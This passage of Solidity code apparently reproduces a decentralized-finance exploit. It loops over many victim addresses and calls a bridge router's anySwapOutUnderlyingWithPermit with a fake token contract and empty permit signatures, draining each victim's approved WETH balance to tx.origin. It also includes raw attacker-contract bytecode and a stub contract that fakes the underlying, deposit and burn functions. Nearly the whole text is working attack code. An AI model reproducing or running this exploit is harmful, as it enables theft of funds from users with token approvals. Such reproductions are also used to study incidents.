            uint256 v69 = I(xc02a).allowance(x3a10, x6b7a);
            console2.log("I(xc02a).allowance(x3a10, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v70 = 15100000000000000;
            uint256 v70 = I(xc02a).balanceOf(x3a10);
            console2.log("I(xc02a).balanceOf(x3a10)\t->", "15100000000000000 (0.1510 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x3a10,
                    xb4f8,
                    tx.origin,
                    v70,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v71 = type(uint256).max;
            uint256 v71 = I(xc02a).allowance(x32a8, x6b7a);
            console2.log("I(xc02a).allowance(x32a8, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v72 = 15000000000000000;
            uint256 v72 = I(xc02a).balanceOf(x32a8);
            console2.log("I(xc02a).balanceOf(x32a8)\t->", "15000000000000000 (0.1500 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x32a8,
                    xb4f8,
                    tx.origin,
                    v72,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v73 = type(uint256).max;
            uint256 v73 = I(xc02a).allowance(x42f7, x6b7a);
            console2.log("I(xc02a).allowance(x42f7, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v74 = 1000645970059073174;
            uint256 v74 = I(xc02a).balanceOf(x42f7);
            console2.log("I(xc02a).balanceOf(x42f7)\t->", "1000645970059073174 (1.6459 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x42f7,
                    xb4f8,
                    tx.origin,
                    v74,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v75 = type(uint256).max;
            uint256 v75 = I(xc02a).allowance(x71e0, x6b7a);
            console2.log("I(xc02a).allowance(x71e0, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v76 = 600000000000000000;
            uint256 v76 = I(xc02a).balanceOf(x71e0);
            console2.log("I(xc02a).balanceOf(x71e0)\t->", "600000000000000000 (0.6000 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x71e0,
                    xb4f8,
                    tx.origin,
                    v76,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v77 = type(uint256).max;
            uint256 v77 = I(xc02a).allowance(x7fc3, x6b7a);
            console2.log("I(xc02a).allowance(x7fc3, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v78 = 12500000000000000;
            uint256 v78 = I(xc02a).balanceOf(x7fc3);
            console2.log("I(xc02a).balanceOf(x7fc3)\t->", "12500000000000000 (0.1250 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x7fc3,
                    xb4f8,
                    tx.origin,
                    v78,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v79 = type(uint256).max;
            uint256 v79 = I(xc02a).allowance(x42e7, x6b7a);
            console2.log("I(xc02a).allowance(x42e7, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v80 = 16203440434723306;
            uint256 v80 = I(xc02a).balanceOf(x42e7);
            console2.log("I(xc02a).balanceOf(x42e7)\t->", "16203440434723306 (0.1620 ether)");
        }
        {
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x42e7,
                    xb4f8,
                    tx.origin,
                    16203440434723306,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v81 = type(uint256).max;
            uint256 v81 = I(xc02a).allowance(x81fd, x6b7a);
            console2.log("I(xc02a).allowance(x81fd, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v82 = 16000000000000000;
            uint256 v82 = I(xc02a).balanceOf(x81fd);
            console2.log("I(xc02a).balanceOf(x81fd)\t->", "16000000000000000 (0.1600 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x81fd,
                    xb4f8,
                    tx.origin,
                    v82,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v83 = type(uint256).max;
            uint256 v83 = I(xc02a).allowance(x92de, x6b7a);
            console2.log("I(xc02a).allowance(x92de, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v84 = 35801268182919700;
            uint256 v84 = I(xc02a).balanceOf(x92de);
            console2.log("I(xc02a).balanceOf(x92de)\t->", "35801268182919700 (0.3580 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x92de,
                    xb4f8,
                    tx.origin,
                    v84,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v85 = type(uint256).max;
            uint256 v85 = I(xc02a).allowance(xa646, x6b7a);
            console2.log("I(xc02a).allowance(xa646, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v86 = 400000000000000000;
            uint256 v86 = I(xc02a).balanceOf(xa646);
            console2.log("I(xc02a).balanceOf(xa646)\t->", "400000000000000000 (0.4000 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    xa646,
                    xb4f8,
                    tx.origin,
                    v86,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v87 = type(uint256).max;
            uint256 v87 = I(xc02a).allowance(x318c, x6b7a);
            console2.log("I(xc02a).allowance(x318c, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v88 = 32090000000000000;
            uint256 v88 = I(xc02a).balanceOf(x318c);
            console2.log("I(xc02a).balanceOf(x318c)\t->", "32090000000000000 (0.3209 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x318c,
                    xb4f8,
                    tx.origin,
                    v88,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v89 = type(uint256).max;
            uint256 v89 = I(xc02a).allowance(xad8c, x6b7a);
            console2.log("I(xc02a).allowance(xad8c, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v90 = 159476397689759297;
            uint256 v90 = I(xc02a).balanceOf(xad8c);
            console2.log("I(xc02a).balanceOf(xad8c)\t->", "159476397689759297 (0.1594 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    xad8c,
                    xb4f8,
                    tx.origin,
                    v90,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v91 = type(uint256).max;
            uint256 v91 = I(xc02a).allowance(x566a, x6b7a);
            console2.log("I(xc02a).allowance(x566a, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v92 = 181000000000000000;
            uint256 v92 = I(xc02a).balanceOf(x566a);
            console2.log("I(xc02a).balanceOf(x566a)\t->", "181000000000000000 (0.1810 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x566a,
                    xb4f8,
                    tx.origin,
                    v92,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v93 = type(uint256).max;
            uint256 v93 = I(xc02a).allowance(x25c4, x6b7a);
            console2.log("I(xc02a).allowance(x25c4, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v94 = 19933000000000000;
            uint256 v94 = I(xc02a).balanceOf(x25c4);
            console2.log("I(xc02a).balanceOf(x25c4)\t->", "19933000000000000 (0.1993 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x25c4,
                    xb4f8,
                    tx.origin,
                    v94,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v95 = type(uint256).max;
            uint256 v95 = I(xc02a).allowance(x6cba, x6b7a);
            console2.log("I(xc02a).allowance(x6cba, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v96 = 50000000000000000;
            uint256 v96 = I(xc02a).balanceOf(x6cba);
            console2.log("I(xc02a).balanceOf(x6cba)\t->", "50000000000000000 (0.5000 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x6cba,
                    xb4f8,
                    tx.origin,
                    v96,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v97 = type(uint256).max;
            uint256 v97 = I(xc02a).allowance(x9396, x6b7a);
            console2.log("I(xc02a).allowance(x9396, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v98 = 115327498255876082;
            uint256 v98 = I(xc02a).balanceOf(x9396);
            console2.log("I(xc02a).balanceOf(x9396)\t->", "115327498255876082 (0.1153 ether)");
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    x9396,
                    xb4f8,
                    tx.origin,
                    v98,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
            // uint256 v99 = type(uint256).max;
            uint256 v99 = I(xc02a).allowance(xa05d, x6b7a);
            console2.log("I(xc02a).allowance(xa05d, x6b7a)\t->", uint256(type(uint256).max));
            // uint256 v100 = 46386820353327045;
            uint256 v100 = I(xc02a).balanceOf(xa05d);
            console2.log("I(xc02a).balanceOf(xa05d)\t->", "46386820353327045 (0.4638 ether)");
        }
        {
            I(x6b7a)
                .anySwapOutUnderlyingWithPermit(
                    xa05d,
                    xb4f8,
                    tx.origin,
                    46386820353327045,
                    100000000000000000000,
                    0,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    56
                );
        }
    }

    function x791995a6() public {
        _constructor_();
    }

    function _constructor_() public {
        bytes memory rt =
            hex"6080604052600436106100295760003560e01c80630539154b1461002b5780635786c92614610130575b005b34801561003757600080fd5b5061012e6004803603606081101561004e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019064010000000081111561008b57600080fd5b82018360208201111561009d57600080fd5b803590602001918460208302840111640100000000831117156100bf57600080fd5b919080806020026020016040519081016040528093929190818152602001838360200280828437600081840152601f19601f820116905080830192505050505050509192919290803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610215565b005b6102136004803603606081101561014657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291908035906020019064010000000081111561018d57600080fd5b82018360208201111561019f57600080fd5b803590602001918460018302840111640100000000831117156101c157600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f8201169050808301925050505050505091929192905050506106af565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461026e57600080fd5b8273ffffffffffffffffffffffffffffffffffffffff16630ad5c04f826040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b1580156102ed57600080fd5b505af1158015610301573d6000803e3d6000fd5b50505050600080600090505b83518110156106a85760008373ffffffffffffffffffffffffffffffffffffffff1663dd62ed3e86848151811061034057fe5b6020026020010151600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019250505060206040518083038186803b1580156103fe57600080fd5b505afa158015610412573d6000803e3d6000fd5b505050506040513d602081101561042857600080fd5b8101908080519060200190929190505050905060008473ffffffffffffffffffffffffffffffffffffffff166370a0823187858151811061046557fe5b60200260200101516040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b1580156104cd57600080fd5b505afa1580156104e1573d6000803e3d6000fd5b505050506040513d60208110156104f757600080fd5b8101908080519060200190929190505050905081811115610516578190505b600081141561052657505061069b565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16638d7d3eea87858151811061057057fe5b602002602001015189338568056bc75e2d6310000060008b8c60386040518a63ffffffff1660e01b8152600401808a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018781526020018681526020018560ff1681526020018481526020018381526020018281526020019950505050505050505050600060405180830381600087803b15801561068057600080fd5b505af1158015610694573d6000803e3d6000fd5b5050505050505b808060010191505061030d565b5050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461070857600080fd5b60008373ffffffffffffffffffffffffffffffffffffffff1683836040518082805190602001908083835b602083106107565780518252602082019150602081019050602083039250610733565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d80600081146107b8576040519150601f19603f3d011682016040523d82523d6000602084013e6107bd565b606091505b50509050806107cb57600080fd5b5050505056fea265627a7a72315820264a2cf299214dc1c45f96989bccc95d92adc4702ae40d35ba2946641e21b92d64736f6c63430005110032";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract Xb4f8 {
    address immutable r = address(this);
    receive() external payable {}

    constructor() payable {}

    function underlying() public {
        bytes memory rt = abi.encodePacked(abi.encode(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function depositVault(uint256, address) public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function x0ad5c04f() public {}

    function burn(address, uint256) public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0x0ad5c04f) {
            x0ad5c04f();
            return;
        }
        revert("no such function");
    }
}
